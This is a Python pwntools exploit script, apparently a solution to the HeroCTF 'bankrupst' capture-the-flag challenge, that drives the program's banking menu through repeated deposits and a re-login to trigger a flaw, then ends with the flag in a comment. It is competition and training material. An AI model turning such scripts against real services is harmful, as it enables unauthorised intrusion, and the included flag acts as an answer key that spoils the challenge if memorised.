#!/usr/bin/env python3

from pwn import *

elf = ELF("./bankrupst_patched")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hp', '70']
#context.log_level = "debug"
gs = '''
continue
'''

def start():
    if args.REMOTE:
        return remote("pwn.heroctf.fr", 6001)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    else:
        return process([elf.path])

r = start()

def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val):  log.info(name+" = %#x" % val)
def sa(delim,data): return r.sendafter(delim,data)
def sla(delim,line): return r.sendlineafter(delim,line)
def sl(line): return r.sendline(line)
def rcu(d1, d2=0):
  r.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return r.recvuntil(d2,drop=True)

#========= exploit here ===================

sla(b"an option:",b"1")

for i in range(13):
    sl(b"2")
    sla(b"deposit?", b"100")
    sleep(0.2)

sl(b"5")
sla(b"an option: ", b"1")
sleep(0.2)
sl(b"2")
sla(b"deposit?", b"100")
sleep(0.2)
sl(b"4")

#========= interactive ====================
r.interactive()
#Hero{B4nkk_Rupst3dDd!!1x33x7}